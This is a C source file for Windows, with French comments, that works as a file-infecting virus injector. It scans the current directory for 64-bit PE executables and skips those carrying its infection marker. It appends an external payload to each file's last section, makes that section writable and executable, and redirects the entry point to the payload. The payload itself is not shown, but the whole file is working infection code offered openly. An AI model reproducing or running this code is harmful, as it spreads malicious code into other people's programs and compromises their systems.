#include <windows.h>
#include <stdio.h>
#include <string.h>

extern char payload[];
extern char __begin_of_code;
extern LONGLONG __end_of_code;
extern LONGLONG delta;

// Fonction pour vérifier si un fichier est un PE 64-bit
BOOL IsPE64(const char* filename) {
    HANDLE hFile = CreateFile(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    DWORD bytesRead;
    IMAGE_DOS_HEADER dosHeader;
    
    if (!ReadFile(hFile, &dosHeader, sizeof(dosHeader), &bytesRead, NULL) || 
        bytesRead != sizeof(dosHeader) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(hFile);
        return FALSE;
    }

    SetFilePointer(hFile, dosHeader.e_lfanew, NULL, FILE_BEGIN);
    
    IMAGE_NT_HEADERS64 ntHeader;
    if (!ReadFile(hFile, &ntHeader, sizeof(ntHeader), &bytesRead, NULL) ||
        bytesRead != sizeof(ntHeader) || ntHeader.Signature != IMAGE_NT_SIGNATURE) {
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    
    return (ntHeader.FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 && 
            ntHeader.OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC);
}

BOOL IsAlreadyInfected(const char* filename) {
    HANDLE hFile = CreateFile(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    DWORD bytesRead;
    
    SetFilePointer(hFile, fileSize - 8, NULL, FILE_BEGIN);
    LONGLONG signature;
    ReadFile(hFile, &signature, sizeof(signature), &bytesRead, NULL);
    
    CloseHandle(hFile);
    
    return (signature == 0x1337DEADBEEF1337LL);
}

BOOL InjectFile(const char* filename) {
    printf("Injection dans: %s\n", filename);
    
    HANDLE hFile = CreateFile(filename, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING,
                             FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFile() ERROR pour %s\n", filename);
        return FALSE;
    }

    DWORD sizeOfCode = (DWORD)((PUCHAR)&__end_of_code + sizeof(LONGLONG)
                              - (PUCHAR)&__begin_of_code);

    DWORD dwFileSize = GetFileSize(hFile, NULL);
    DWORD dwNewFileSize = dwFileSize + sizeOfCode + 8; // +8 pour la signature

    HANDLE hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwNewFileSize, NULL);
    if (hMapFile == NULL) {
        printf("Erreur CreateFileMapping pour %s: %d\n", filename, GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    PUCHAR lpMapAdr = (PUCHAR) MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (lpMapAdr == NULL) {
        printf("Erreur MapViewOfFile pour %s: %d\n", filename, GetLastError());
        CloseHandle(hMapFile);
        CloseHandle(hFile);
        return FALSE;
    }

    // Parsing des headers PE
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) lpMapAdr;
    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)(lpMapAdr + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)
        ((PUCHAR)pNtHeader + sizeof(IMAGE_NT_HEADERS64));

    // Récupération de la dernière section
    PIMAGE_SECTION_HEADER pLastSection = (PIMAGE_SECTION_HEADER)
        ((PUCHAR)pSectionHeader +
        (pNtHeader->FileHeader.NumberOfSections - 1) * sizeof(IMAGE_SECTION_HEADER));

    // Calcul des adresses
    DWORD OldEntry = pNtHeader->OptionalHeader.AddressOfEntryPoint;
    DWORD szData = pLastSection->SizeOfRawData;
    DWORD NewEntry = pLastSection->VirtualAddress + szData;
    LONGLONG forDelta = (LONGLONG)OldEntry - (LONGLONG)NewEntry;

    DWORD oldProtect;
    VirtualProtect(&delta, 4096, PAGE_READWRITE, &oldProtect);
    delta = forDelta;
    __end_of_code = (LONGLONG)sizeOfCode;

    // Injection du payload
    PUCHAR dstCpy = lpMapAdr + pLastSection->PointerToRawData + pLastSection->SizeOfRawData;
    memcpy(dstCpy, payload, sizeOfCode);

    LONGLONG infectionSignature = 0x1337DEADBEEF1337LL;
    memcpy(dstCpy + sizeOfCode, &infectionSignature, sizeof(infectionSignature));

    pLastSection->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;
    pLastSection->SizeOfRawData += sizeOfCode + 8;
    pLastSection->Misc.VirtualSize += sizeOfCode + 8;

    pNtHeader->OptionalHeader.AddressOfEntryPoint = NewEntry;

    if (!FlushViewOfFile(lpMapAdr, dwNewFileSize)) {
        printf("Erreur FlushViewOfFile pour %s: %d\n", filename, GetLastError());
    }

    UnmapViewOfFile(lpMapAdr);
    CloseHandle(hMapFile);
    CloseHandle(hFile);

    printf("Injection réussie dans %s\n", filename);
    return TRUE;
}

// Fonction principale pour parcourir le répertoire
void InfectCurrentDirectory() {
    WIN32_FIND_DATA findData;
    HANDLE hFind;
    int totalFiles = 0;
    int infectedFiles = 0;
    
    printf("=== INJECTION DYNAMIQUE MULTI-FICHIERS ===\n");
    printf("Scan du répertoire courant...\n\n");

    // Recherche de tous les fichiers .exe
    hFind = FindFirstFile("*.exe", &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("Aucun fichier .exe trouvé dans le répertoire courant.\n");
        return;
    }

    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }

        totalFiles++;
        printf("Fichier trouvé: %s\n", findData.cFileName);

        if (!IsPE64(findData.cFileName)) {
            printf("  -> Ignoré (pas un PE 64-bit)\n");
            continue;
        }

        if (IsAlreadyInfected(findData.cFileName)) {
            printf("  -> Déjà infecté, ignoré\n");
            continue;
        }

        if (InjectFile(findData.cFileName)) {
            infectedFiles++;
            printf("  -> Infection réussie !\n");
        } else {
            printf("  -> Échec de l'infection\n");
        }
        
        printf("\n");

    } while (FindNextFile(hFind, &findData));

    FindClose(hFind);

    printf("=== RÉSULTATS ===\n");
    printf("Fichiers .exe trouvés: %d\n", totalFiles);
    printf("Fichiers infectés: %d\n", infectedFiles);
}

int main(int ac, char **av) {
    printf("INJECTEUR DYNAMIQUE PE64\n");
    printf("========================\n\n");

    if (ac == 2) {
        printf("Mode manuel: injection dans %s\n", av[1]);
        if (IsPE64(av[1])) {
            if (!IsAlreadyInfected(av[1])) {
                InjectFile(av[1]);
            } else {
                printf("Fichier déjà infecté.\n");
            }
        } else {
            printf("Le fichier n'est pas un PE 64-bit valide.\n");
        }
        return 0;
    }

    InfectCurrentDirectory();

    return 0;
}